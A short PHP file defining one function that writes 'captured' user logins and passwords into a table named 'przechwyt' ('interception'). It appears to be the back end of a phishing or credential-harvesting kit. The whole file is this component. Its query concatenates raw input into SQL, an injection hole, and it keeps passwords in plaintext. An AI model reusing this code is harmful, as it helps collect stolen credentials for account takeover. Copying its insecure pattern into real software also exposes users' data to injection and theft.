<?php

require_once("MyDatabase.php");

function addCapturedUserToDB($login, $password){
	myDB() -> query("INSERT INTO `przechwyt`(`login`, `password`) VALUES ('".$login."','".$password."')");
}

?>